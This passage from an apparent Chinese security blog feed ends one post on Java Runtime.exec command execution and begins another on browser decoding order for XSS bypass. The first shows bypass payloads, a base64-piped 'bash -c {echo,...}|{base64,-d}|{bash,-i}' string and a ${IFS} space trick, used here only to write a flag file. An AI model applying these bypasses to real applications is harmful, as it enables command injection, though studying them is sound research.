&#x7CFB;&#x7EDF;&#x627E;&#x4E0D;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x201D;)&#x3002;&#x539F;&#x56E0;&#x662F;echo&#x4E3A;&#x547D;&#x4EE4;&#x884C;&#x89E3;&#x91CA;&#x5668;cmd.exe&#x7684;&#x5185;&#x7F6E;&#x547D;&#x4EE4;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x53EF;&#x6267;&#x884C;&#x7684;&#x7A0B;&#x5E8F;(&#x5982;&#x4E0B;&#x56FE;)&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x60F3;&#x6267;&#x884C;echo&#x547D;&#x4EE4;&#x5199;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5148;&#x542F;&#x52A8;cmd.exe&#xFF0C;&#x7136;&#x540E;&#x5C06;echo&#x547D;&#x4EE4;&#x505A;&#x4E3A;cmd.exe&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x6267;&#x884C;&#x3002;</p>
<p>&#x53E6;&#x5916;&#x5173;&#x4E8E;cmd&#x4E0B;&#x7684; /c &#x53C2;&#x6570;&#xFF0C;&#x5F53;&#x672A;&#x6307;&#x5B9A;&#x65F6;,&#x8FD0;&#x884C;&#x5982;&#x4E0B;&#x793A;&#x4F8B;&#x7A0B;&#x5E8F;,&#x7CFB;&#x7EDF;&#x4F1A;&#x542F;&#x52A8;&#x4E00;&#x4E2A;pid&#x4E3A;8984&#x7684;cmd&#x540E;&#x53F0;&#x8FDB;&#x7A0B;&#xFF0C;&#x7531;&#x4E8E;cmd&#x8FDB;&#x7A0B;&#x672A;&#x7EC8;&#x6B62;&#x5BFC;&#x81F4;java&#x7A0B;&#x5E8F;&#x5361;&#x6B7B;&#x3002;&#x5F53;&#x6307;&#x5B9A;/c&#x65F6;&#xFF0C;cmd&#x8FDB;&#x7A0B;&#x4F1A;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#x6210;&#x529F;&#x7EC8;&#x6B62;&#x3002;</p>
<p><strong>&#x6240;&#x4EE5;&#x5728;Windows&#x73AF;&#x5883;&#x4E0B;&#xFF0C;&#x4F7F;&#x7528;Runtime.getRuntime()&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x524D;&#x7F00;&#x9700;&#x8981;&#x52A0;&#x4E0A;cmd /c&#xFF0C;&#x4F7F;&#x5F97;&#x5E95;&#x5C42;Windows&#x7684;processthreadsapi.h#CreateProcessW()&#x65B9;&#x6CD5;&#x5728;&#x521B;&#x5EFA;&#x65B0;&#x8FDB;&#x7A0B;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x6B63;&#x786E;&#x8BC6;&#x522B;cmd&#x4E14;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x3002;</strong></p>
</blockquote>
<h2 id="String-command-base64encode"><a href="#String-command-base64encode" class="headerlink" title="String command + base64encode"></a>String command + base64encode</h2><ul>
<li><p>&#x4F18;&#x52BF;</p>
<ul>
<li>&#x9002;&#x7528;&#x4E8E;&#x5B57;&#x7B26;&#x4E32;&#x547D;&#x4EE4;&#x4F20;&#x53C2;</li>
</ul>
</li>
<li><p>&#x7F3A;&#x70B9;</p>
<ul>
<li>&#x65E0;</li>
</ul>
</li>
</ul>
<p>&#x5B57;&#x7B26;&#x4E32;&#x547D;&#x4EE4;&#x4F20;&#x53C2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; @jackson &#x8FD9;&#x4E2A;&#x56FD;&#x5916;&#x7814;&#x7A76;&#x5458;&#x7684;&#x65B9;&#x5F0F;&#x89E3;&#x51B3;&#xFF1A;<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Process  procdemo = Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c {echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d}|{bash,-i}&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0B;&#x9762;&#x8FDB;&#x884C;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;</p>
<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x7A7A;&#x683C;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x5373;&#x4F7F;&#x7ECF;&#x8FC7; <code>StringTokenizer</code> &#x5904;&#x7406;&#xFF0C;&#x4F9D;&#x7136;&#x53EA;&#x5206;&#x5272;&#x6210;&#x4E86;&#x4E09;&#x4E2A;&#x53C2;&#x6570;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105225722972.png" alt="image-20210105225722972"></p>
<p>&#x6700;&#x540E;&#x4F20;&#x5165; <code>java.lang.UNIXProcess#forkAndExec</code> &#x65F6;&#x4E5F;&#x662F;&#x5982;&#x6211;&#x4EEC;&#x6240;&#x671F;&#x671B;&#x7684;&#x90A3;&#x6837;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105225923407.png" alt="image-20210105225923407"></p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105225908619.png" alt="image-20210105225908619"></p>
<p>&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;payload&#x7684;&#x6784;&#x9020;&#x6709;&#x4EC0;&#x4E48;&#x5DE7;&#x5999;&#xFF1F;</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">bash -c {<span class="hljs-built_in">echo</span>,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6211;&#x4EEC;&#x5BF9;&#x8FD9;&#x4E2A; payload &#x8FDB;&#x884C;&#x4ECE;&#x5DE6;&#x81F3;&#x53F3;&#x7684;&#x5206;&#x6790;</p>
<p>&#x9996;&#x5148; <code>bash -c</code> &#x540C;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5206;&#x6790;&#x6240;&#x7528;&#x7684; <code>/bin/sh -c</code> &#x662F;&#x4E00;&#x6837;&#x7684;&#x9053;&#x7406;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x8C03;&#x7528;&#x7684;&#x73AF;&#x5883;&#x4E0D;&#x4E00;&#x6837;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105230506285.png" alt="image-20210105230506285"></p>
<p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5206;&#x6790; <code>{echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d}</code></p>
<p>&#x5176;&#x5B9E;&#x5C31;&#x662F; &#x5927;&#x62EC;&#x53F7; + &#x7BA1;&#x9053;&#x7B26; &#x7684;&#x5229;&#x7528;&#xFF0C;&#x6838;&#x5FC3;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x7684;&#x9650;&#x5236;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x88AB; <code>StringTokenizer</code> &#x5904;&#x7406;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105231756910.png" alt="image-20210105231756910"></p>
<p>&#x63A5;&#x7740;&#x5206;&#x6790;</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">echo</span> flag &gt; flag.txt|{bash,-i}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>bash -i</code> &#x5E38;&#x89C1;&#x7528;&#x4E8E;&#x53CD;&#x5F39;shell&#x4E2D;&#xFF0C;&#x5176;&#x6838;&#x5FC3;&#x662F; <code>-i</code> &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x8868;&#x793A;&#x7684;&#x662F;&#x4EA7;&#x751F;&#x4EA4;&#x4E92;&#x5F0F;&#x7684;shell</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.gif" alt="1"></p>
<p>&#x518D;&#x5EF6;&#x4F38;&#x4E00;&#x4E0B;&#x601D;&#x8DEF;&#xFF1A;</p>
<p>&#x7ECF;&#x8FC7;&#x4E0A;&#x9762;&#x7684;&#x5206;&#x6790;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x6838;&#x5FC3;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x4E00;&#x4E2A; bypass &#x7B26;&#x53F7;&#x7684;&#x95EE;&#x9898;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210106145037368.png" alt="image-20210106145037368"></p>
<p>&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x7684;&#x4E5F;&#x5C31;&#x662F;&#x7528; shell &#x80FD;&#x8BC6;&#x522B;&#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x88AB; <code>StringTokenizer</code> &#x5207;&#x5272;&#x7684;</p>
<p>&#x60F3;&#x60F3; CTF &#x4E2D;&#x6700;&#x5E38;&#x89C1;&#x7684; bypass &#x7A7A;&#x683C;&#x7684;&#x65B9;&#x5F0F; <code>${IFS}</code></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Process  procdemo = Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash echo${IFS}flag&gt;flag.txt&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210106145538593.png" alt="image-20210106145538593"></p>
<p>&#x6839;&#x636E;&#x6700;&#x540E;&#x4F20;&#x53C2;&#x683C;&#x5F0F;&#x6765;&#x770B;&#x662F;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7684;</p>
<p>&#x4F46;&#x662F;&#x672C;&#x5730;&#x4E3A; MacOS &#x73AF;&#x5883;&#xFF0C;&#x65E0;&#x6CD5;&#x6D4B;&#x8BD5;&#x6700;&#x7EC8;&#x7ED3;&#x679C;<img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210104221719003.png" alt></p>
<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>&#x5728;&#x540E;&#x9762;&#x8C03;&#x8BD5;&#x7684;  <code>ProcessBuilder#start()</code> &#x8FC7;&#x7A0B;&#x4E2D;&#x770B;&#x5230;&#x4E86; @&#x674E;&#x4E09; &#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#xFF1A;<a href="https://xz.aliyun.com/t/7046" target="_blank" rel="noopener">https://xz.aliyun.com/t/7046</a> &#x4EE5;&#x53CA; @threedr3am &#x5E08;&#x5085;&#x7684;&#x8BC4;&#x8BBA;&#x3002;</p>
<p>&#x5199;&#x7684;&#x592A;&#x7EC6;&#x4E86;&#xFF0C;&#x672C;&#x6765;&#x6211;&#x5DF2;&#x7ECF;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x8865;&#x5145;&#x7A7A;&#x95F4;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x662F;&#x91CD;&#x65B0;&#x5199;&#x4E86;&#x4E00;&#x904D;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x5199;&#x70B9;&#x4E1C;&#x897F;&#x624D;&#x80FD;&#x6C89;&#x6DC0;&#x4E0B;&#x6765;</p>
<p><img src="/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20210105183122187.png" alt="image-20210105183122187"></p>
<p>REF&#xFF1A;</p>
<p><a href="https://xz.aliyun.com/t/7046" target="_blank" rel="noopener">https://xz.aliyun.com/t/7046</a></p>
<p><a href="https://www.anquanke.com/post/id/221159" target="_blank" rel="noopener">https://www.anquanke.com/post/id/221159</a></p>
<p><a href="https://mp.weixin.qq.com/s/pzpc44-xH932M4eCJ8LxYg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pzpc44-xH932M4eCJ8LxYg</a></p>
</body></html>]]></content>
      <categories>
        <category>Java Sec</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器解析机制与渲染过程</title>
    <url>/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<html><head></head><body><p>&#x6D4F;&#x89C8;&#x5668;&#x7F16;&#x89E3;&#x7801;&#x4E0E;XSS bypass</p>
<a id="more"></a>

<h2 id="&#x5E8F;&#x7AE0;"><a href="#&#x5E8F;&#x7AE0;" class="headerlink" title="&#x5E8F;&#x7AE0;"></a>&#x5E8F;&#x7AE0;</h2><p>&#x8BBA;&#x4E00;&#x5F20;&#x56FE;&#x6253;&#x8D25;&#x4F60;&#x5B66; XSS &#x7684;&#x4FE1;&#x5FC3;&#x3002;&#xFF08;&#x8F6C;&#x81EA;&#x5FAE;&#x535A;<br><img src="/2020/03/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B/image-20201113201812123.png" alt="image-20201113201812123"></p>
<p>&#x9644;&#x4E0A; MDN DOM &#x4E8B;&#x4EF6;&#x53C2;&#x8003;: <a href="https://developer.mozilla.org/zh-CN/docs/Web/Events" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Events</a></p>
<p>&#x672C;&#x6587;&#x53C2;&#x8003;&#x591A;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x6D89;&#x53CA;&#x76F8;&#x5173;&#x6666;&#x6DA9;&#x96BE;&#x61C2;&#x540D;&#x8BCD;&#x89E3;&#x91CA;&#xFF0C;&#x672F;&#x8BED;&#x89E3;&#x91CA;&#x3002;&#x5747;&#x662F; CTRL c v &#x3002;&#x5C5E;&#x4E8E;&#x53EA;&#x53EF;&#x610F;&#x4F1A;&#x4E0D;&#x53EF;&#x8A00;&#x4F20;&#x7684;&#x9886;&#x57DF;&#x3002;&#x5176;&#x4ED6;&#x7684;&#x77E5;&#x8BC6;&#x90FD;&#x4F1A;&#x5C3D;&#x91CF;&#x7ECF;&#x6211;&#x53E3;&#x4E2D;&#x9610;&#x8FF0;&#x7684;&#x7B80;&#x5355;&#x4E00;&#x70B9;&#x3002;</p>
<h2 id="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;"></a>&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;</h2><h3 id="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;"></a>&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x7801;&#x89C4;&#x5219;</h3><ul>
<li>HTML&#x89E3;&#x6790;&#x5668;&#x5BF9;HTML&#x6587;&#x6863;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x5B8C;&#x6210;HTML&#x89E3;&#x7801;&#x5E76;&#x4E14;&#x521B;&#x5EFA;DOM&#x6811;</li>
<li>javascript &#x6216;&#x8005; CSS&#x89E3;&#x6790;&#x5668;&#x5BF9;&#x5185;&#x8054;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x5B8C;&#x6210;JS CSS&#x89E3;&#x7801;</li>
<li>URL&#x89E3;&#x7801;&#x4F1A;&#x6839;&#x636E;URL&#x6240;&#x5728;&#x7684;&#x987A;&#x5E8F;&#x4E0D;&#x540C;&#x800C;&#x5728;JS&#x89E3;&#x7801;&#x524D;&#x6216;&#x8005;&#x89E3;&#x7801;&#x540E;</li>
</ul>
<p>&#x5F53;&#x6D4F;&#x89C8;&#x5668;&#x4ECE;&#x7F51;&#x7EDC;&#x5806;&#x6808;&#x4E2D;&#x83B7;&#x5F97;&#x4E00;&#x6BB5;&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x89E6;&#x53D1;HTML&#x89E3;&#x6790;&#x5668;&#x6765;&#x5BF9;&#x8FD9;&#x7BC7;&#x6587;&#x6863;&#x8FDB;&#x884C;&#x8BCD;&#x6CD5;&#x89E3;&#x6790;&#x3002;&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x4E2D;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x88AB;&#x89E3;&#x7801;&#x3002;&#x5728;&#x8BCD;&#x6CD5;&#x89E3;&#x6790;&#x5B8C;&#x6210;&#x540E;&#xFF0C;DOM&#x6811;&#x5C31;&#x88AB;&#x521B;&#x5EFA;&#x597D;&#x4E86;&#xFF0C;JavaScript&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x4ECB;&#x5165;&#x6765;&#x5BF9;&#x5185;&#x8054;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x3002;&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x4E2D;Unicode&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x548C;Hex&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x88AB;&#x89E3;&#x7801;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x6D4F;&#x89C8;&#x5668;&#x9047;&#x5230;&#x9700;&#x8981;URL&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;URL&#x89E3;&#x6790;&#x5668;&#x4E5F;&#x4F1A;&#x4ECB;&#x5165;&#x6765;&#x89E3;&#x7801;URL&#x5185;&#x5BB9;&#x3002;&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x4E2D;URL&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x88AB;&#x5B8C;&#x6210;&#x3002;&#x7531;&#x4E8E;URL&#x4F4D;&#x7F6E;&#x4E0D;&#x540C;&#xFF0C;URL&#x89E3;&#x6790;&#x5668;&#x53EF;&#x80FD;&#x4F1A;&#x5728;JavaScript&#x89E3;&#x6790;&#x5668;&#x4E4B;&#x524D;&#x6216;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x3002;</p>
<p></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line">Example A: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;UserInput&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line">Example B: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;window.open(&apos;UserInput&apos;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line">Example C: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:window.open(&apos;UserInput&apos;)&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>&#x5728;&#x4F8B;A&#x4E2D;&#xFF0C;HTML&#x89E3;&#x6790;&#x5668;&#x5C06;&#x9996;&#x5148;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C;&#xFF0C;&#x5E76;&#x5BF9;UserInput&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#x3002;&#x7136;&#x540E;URL&#x89E3;&#x6790;&#x5668;&#x5F00;&#x59CB;&#x5BF9;href&#x503C;&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x3002;&#x6700;&#x540E;&#xFF0C;&#x5982;&#x679C;URL&#x8D44;&#x6E90;&#x7C7B;&#x578B;&#x662F;JavaScript&#xFF0C;&#x90A3;&#x4E48;JavaScript&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x8FDB;&#x884C;Unicode&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x548C;Hex&#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x7684;&#x89E3;&#x7801;&#x3002;&#x518D;&#x4E4B;&#x540E;&#xFF0C;&#x89E3;&#x7801;&#x7684;&#x811A;&#x672C;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x8FD9;&#x91CC;&#x6D89;&#x53CA;&#x4E09;&#x8F6E;&#x89E3;&#x7801;&#xFF0C;&#x987A;&#x5E8F;&#x662F;HTML&#xFF0C;URL&#x548C;JavaScript&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x5728;&#x4F8B;B&#x4E2D;&#xFF0C;HTML&#x89E3;&#x6790;&#x5668;&#x9996;&#x5148;&#x5DE5;&#x4F5C;&#x3002;&#x7136;&#x800C;&#x63A5;&#x4E0B;&#x6765;&#xFF0C;JavaScript&#x89E3;&#x6790;&#x5668;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x5728;onclick&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x5668;&#x4E2D;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x5728;onclick&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x5668;&#x4E2D;&#x662F;script&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x3002;&#x5F53;&#x8FD9;&#x6BB5;JavaScript&#x88AB;&#x89E3;&#x6790;&#x5E76;&#x88AB;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x6267;&#x884C;&#x7684;&#x662F;&#x201C;window.open()&#x201D;&#x64CD;&#x4F5C;&#xFF0C;&#x5176;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x662F;URL&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x3002;&#x5728;&#x6B64;&#x65F6;&#xFF0C;URL&#x89E3;&#x6790;&#x5668;&#x5F00;&#x59CB;&#x5BF9;UserInput&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x5E76;&#x628A;&#x7ED3;&#x679C;&#x56DE;&#x4F20;&#x7ED9;JavaScript&#x5F15;&#x64CE;&#x3002;&#x56E0;&#x6B64;&#x8FD9;&#x91CC;&#x4E00;&#x5171;&#x6D89;&#x53CA;&#x4E09;&#x8F6E;&#x89E3;&#x7801;&#xFF0C;&#x987A;&#x5E8F;&#x662F;HTML&#xFF0C;JavaScript&#x548C;URL&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x4F8B;C&#x4E0E;&#x4F8B;A&#x5F88;&#x50CF;&#xFF0C;&#x4F46;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x5728;UserInput&#x524D;&#x591A;&#x4E86;window.open()&#x64CD;&#x4F5C;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5BF9;UserInput&#x591A;&#x4E86;&#x4E00;&#x6B21;&#x989D;&#x5916;&#x7684;URL&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x3002;&#x603B;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x56DB;&#x8F6E;&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x88AB;&#x5B8C;&#x6210;&#xFF0C;&#x987A;&#x5E8F;&#x662F;HTML&#xFF0C;URL&#xFF0C;JavaScript&#x548C;URL&#x3002;</p>
</blockquote>
<h3 id="HTML-&#x89E3;&#x6790;"><a href="#HTML-&#x89E3;&#x6790;" class="headerlink" title="HTML &#x89E3;&#x6790;"></a>HTML &#x89E3;&#x6790;</h3><p>&#x6982;&#x62EC; HTML &#x4E2D;&#x4E94;&#x7C7B;&#x5143;&#x7D20;&#x3002;&#x8BE6;&#x7EC6;&#x53EF;&#x76F4;&#x63A5;&#x53C2;&#x8003;HTML5 &#x8BED;&#x6CD5;<br><a href="https://www.w3.org/html/ig/zh/wiki/HTML5/syntax" target="_blank" rel="noopener">https://www.w3.org/html/ig/zh/wiki/HTML5/syntax</a></p>
<ol>
<li>&#x7A7A;&#x5143;&#x7D20;: &#x7A7A;&#x4E00;&#x5B57;&#x4F53;&#x73B0;&#x5728;&#x4E0D;&#x80FD;&#x5BB9;&#x7EB3;&#x5185;&#x5BB9;&#x3002;&#x4E00;&#x822C;&#x7684;&#x6807;&#x7B7E;&#x7531; <code>&lt;start&gt;content&lt;/end&gt;</code>&#x8FD9;&#x6837;&#x7EC4;&#x6210;&#x3002;&#x7A7A;&#x5143;&#x7D20;&#x610F;&#x5473;&#x7740;&#x6CA1;&#x6709;&#x95ED;&#x5408;&#x6807;&#x7B7E;&#x7684;&#x6807;&#x7B7E;&#x3002;&#x5982;: <code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code></li>
<li>&#x539F;&#x59CB;&#x6587;&#x672C;&#x5143;&#x7D20;: &#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x5185;&#x5BB9;&#x3002; <code>&lt;script&gt;</code>&#x548C;<code>&lt;style&gt;</code>&#x3002;</li>
<li>RCDATA&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x548C;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3002;<code>&lt;textarea&gt;</code>&#x548C;<code>&lt;title&gt;</code></li>
<li>&#x5916;&#x90E8;&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x3001;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3001;CDATA&#x6BB5;&#x3001;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x548C;&#x6CE8;&#x91CA;: &#x5982; MathML&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x6216;&#x8005;SVG&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x7684;&#x5143;&#x7D20;</li>
<li>&#x57FA;&#x672C;&#x5143;&#x7D20;&#xFF0C;&#x53EF;&#x4EE5;&#x5BB9;&#x7EB3;&#x6587;&#x672C;&#x3001;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x3001;&#x5176;&#x4ED6;&#x5143;&#x7D20;&#x548C;&#x6CE8;&#x91CA;: &#x9664;&#x4E86;&#x4EE5;&#x4E0A;4&#x79CD;&#x5143;&#x7D20;&#x4EE5;&#x5916;&#x7684;&#x5143;&#x7D20;</li>
</ol>
<p>&#x4E0A;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x6211;&#x63D0;&#x70BC;&#x4E86;&#x8F83;&#x4E3A;&#x964C;&#x751F;&#x7684;&#x4E13;&#x4E1A;&#x672F;&#x8BED;</p>
<ul>
<li>&#x5B57;&#x7B26;&#x5F15;&#x7528;</li>
<li>RCDATA</li>
<li>&#x5916;&#x90E8;&#x5143;&#x7D20;</li>
</ul>
<p>&#x4EC0;&#x4E48;&#x662F;&#x5B57;&#x7B26;&#x5F15;&#x7528;&#xFF1F;<br>&#x5B57;&#x7B26;&#x5F15;&#x7528;&#x5305;&#x62EC;&#x201C;&#x5B57;&#x7B26;&#x503C;&#x5F15;&#x7528;&#x201D;&#x548C;&#x201C;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x201D;&#x3002;&#x5982;&#x5728;HTML&#x4E2D;&#xFF0C;<code>&lt;</code>&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x7B26;&#x503C;&#x5F15;&#x7528;&#x4E3A;<code>&amp;#60;</code>&#xFF0C;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x4E3A;<code>&amp;lt;</code>&#x3002;&#x5B57;&#x7B26;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x4E5F;&#x88AB;&#x53EB;&#x505A;&#x201C;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x201D;&#x6216;&#x201C;&#x5B9E;&#x4F53;&#x201D;<br>&#x2014;&#x2014;&#x300B;&#x518D;&#x6B21;&#x5EF6;&#x4F38;&#x6982;&#x5FF5